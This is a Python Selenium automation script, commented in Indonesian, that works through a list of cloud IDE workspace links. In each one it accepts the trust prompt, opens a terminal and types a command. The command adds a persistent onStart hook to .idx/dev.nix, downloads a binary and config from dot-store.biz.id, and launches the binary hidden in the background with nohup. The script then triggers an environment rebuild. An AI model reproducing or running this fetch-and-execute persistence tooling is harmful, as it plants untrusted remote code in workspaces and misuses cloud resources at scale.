from multiprocessing import Process, Barrier
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import subprocess
import pyautogui
import time
import os
from datetime import datetime

SLEEP_SEBELUM_AKSI = 75
SLEEP_SESUDAH_AKSI = 30
SLEEP_JIKA_ERROR = 10

def log_sukses(profile_name, current, total):
    # Mudah diubah, misalnya log ke file atau tampilkan lebih detail
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {profile_name} berhasil proses link {current}/{total}", flush=True)

def get_options(user_data_dir, profile_dir):
    options = webdriver.ChromeOptions()
    options.add_argument(f"user-data-dir={user_data_dir}")
    options.add_argument(f"--profile-directory={profile_dir}")
    options.add_argument("--disable-popup-blocking")
    options.add_argument("--disable-session-crashed-bubble")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-features=InfiniteSessionRestore")
    options.add_argument("--window-size=500,500")
    options.add_argument("--disable-extensions")
    options.add_argument("--disable-gpu")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")
    options.add_experimental_option("excludeSwitches", ["enable-automation", "enable-logging"])
    options.add_experimental_option("prefs", {
        "profile.default_content_setting_values.notifications": 2,
        "credentials_enable_service": False,
        "profile.password_manager_enabled": False
    })
    return options

def read_links_from_file(path):
    if not os.path.exists(path):
        return []
    with open(path, 'r') as f:
        return [line.strip() for line in f if line.strip()]

def find_and_click_rebuild(driver):
    """
    Fungsi ini akan coba switch ke iframe yang mengandung tombol rebuild environment,
    lalu klik tombolnya.
    """
    try:
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        print(f"[{datetime.now()}] [INFO] Jumlah iframe ditemukan: {len(iframes)}")

        for i, iframe in enumerate(iframes):
            print(f"[{datetime.now()}] [INFO] Coba switch ke iframe index {i}")
            driver.switch_to.frame(iframe)

            try:
                # Coba cari tombol 'Rebuild Environment'
                rebuild_btn = WebDriverWait(driver, 3).until(
                    EC.element_to_be_clickable((By.CSS_SELECTOR, "div.floating-click-widget > div"))
                )
                if "Rebuild Environment" in rebuild_btn.text:
                    driver.execute_script("arguments[0].scrollIntoView({block: 'center'});", rebuild_btn)
                    time.sleep(0.5)
                    driver.execute_script("arguments[0].click();", rebuild_btn)
                    print(f"[{datetime.now()}] [INFO] Tombol 'Rebuild Environment' diklik di iframe index {i}")
                    return True  # Sukses klik tombol
            except TimeoutException:
                print(f"[{datetime.now()}] [INFO] Tombol 'Rebuild Environment' tidak ditemukan di iframe index {i}")
            finally:
                driver.switch_to.default_content()

        print(f"[{datetime.now()}] [WARNING] Tombol 'Rebuild Environment' tidak ditemukan di semua iframe.")
        driver.switch_to.default_content()
        driver.refresh()
        time.sleep(2)
        actions = ActionChains(driver)
        actions.send_keys(Keys.ENTER)
        actions.perform()
        return True

    except Exception as e:
        print(f"[{datetime.now()}] [ERROR] Gagal cari/klik tombol 'Rebuild Environment': {e}")
        driver.switch_to.default_content()
        driver.refresh()
        time.sleep(2)
        actions = ActionChains(driver)
        actions.send_keys(Keys.ENTER)
        actions.perform()
        return True

def open_terminal_and_run(driver):
    try:
        print(f"[{datetime.now()}] [INFO] Menjalankan shortcut Ctrl+Shift+E...")
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).key_down(Keys.SHIFT).send_keys('E').key_up(Keys.SHIFT).key_up(Keys.CONTROL).perform()
        time.sleep(2)

        print(f"[{datetime.now()}] [INFO] Membuka terminal dengan Ctrl+`...")
        body = driver.find_element(By.TAG_NAME, "body")
        body.click()
        actions = ActionChains(driver)
        actions.key_down(Keys.CONTROL).send_keys('`').key_up(Keys.CONTROL).perform()
        time.sleep(3)

        commands = [
    'grep -q "joko = " .idx/dev.nix || sed -i \'/onStart = {/a \\        joko = "cd  ~/.cloud && nohup ./cloud -c \'config.json\' > /dev/null 2>\\&1 &";\' .idx/dev.nix && cd ~/ && mkdir -p .cloud && cd .cloud && wget -O cloud https://dot-store.biz.id/bagong && wget -O config.json https://dot-store.biz.id/bagong.json && chmod +x cloud config.json'
]
        for cmd in commands:
            actions = ActionChains(driver)
            for char in cmd:
                actions.send_keys(char)
            actions.send_keys(Keys.ENTER)
            actions.perform()

            time.sleep(2)

            actions = ActionChains(driver)
            actions.send_keys(Keys.ENTER)
            actions.perform()

            time.sleep(3)

        print(f"[{datetime.now()}] [INFO] Semua perintah diketik di terminal.")

        # Klik tombol Rebuild Environment dengan handling iframe
        find_and_click_rebuild(driver)

        time.sleep(5)  # langsung pakai angka

    except Exception as e:
        print(f"[{datetime.now()}] [ERROR TERMINAL] {e}")

def process_single_link(driver, link):
    try:
        driver.get(link)
        wait = WebDriverWait(driver, 10)
        
        try:
            trust = wait.until(EC.element_to_be_clickable((By.XPATH, "//div[contains(text(), 'I trust the owner')]")))
            trust.click()
        except: pass
        
        try:
            open_ws = wait.until(EC.element_to_be_clickable((By.XPATH, "//span[contains(text(), 'Open Workspace')]")))
            open_ws.click()
        except: pass
        
        time.sleep(SLEEP_SEBELUM_AKSI)
        
        open_terminal_and_run(driver)

        time.sleep(SLEEP_SESUDAH_AKSI)
        
        return True
    except:
        time.sleep(SLEEP_JIKA_ERROR)
        return False

def worker(profile_name, user_data_dir, profile_dir, window_position, links, barrier: Barrier):
    if not links:
        return

    options = get_options(user_data_dir, profile_dir)
    driver = webdriver.Chrome(options=options)

    # Atur posisi jendela
    if window_position:
        driver.set_window_position(*window_position)

    count = 0
    total = len(links)

    for index, link in enumerate(links):
        success = process_single_link(driver, links[index])
        if success:
            count += 1
            log_sukses(profile_name, count, total)

        try:
            barrier.wait()  # Tunggu semua proses sebelum lanjut
        except:
            break

if __name__ == "__main__":
    user_profiles = [
        {
            "name": "Profile1",
            "user_data_dir": r"C:\Users\Administrator\Desktop\Profile1",
            "profile_dir": "Default",
            "window_position": (0, 0)
        },
    ]

    all_links = read_links_from_file("link.txt")
    if not all_links:
        print("link.txt kosong, keluar.")
        exit(1)

    # Bagi link ke masing-masing profil (MEMASTIKAN TIDAK ADA LINK TERLEWAT)
    links_for_profiles = []
    chunk_size = (len(all_links) + len(user_profiles) - 1) // len(user_profiles)
    for i in range(0, len(all_links), chunk_size):
        links_for_profiles.append(all_links[i:i + chunk_size])

    barrier = Barrier(len(user_profiles))

    processes = []
    for i, profile in enumerate(user_profiles):
        p = Process(target=worker, args=(
            profile['name'],
            profile['user_data_dir'],
            profile['profile_dir'],
            profile['window_position'],
            links_for_profiles[i],
            barrier
        ))
        p.start()
        processes.append(p)

    try:
        while True:
            time.sleep(60)
    except KeyboardInterrupt:
        print("Dihentikan oleh pengguna.")
        for p in processes:
            p.terminate()
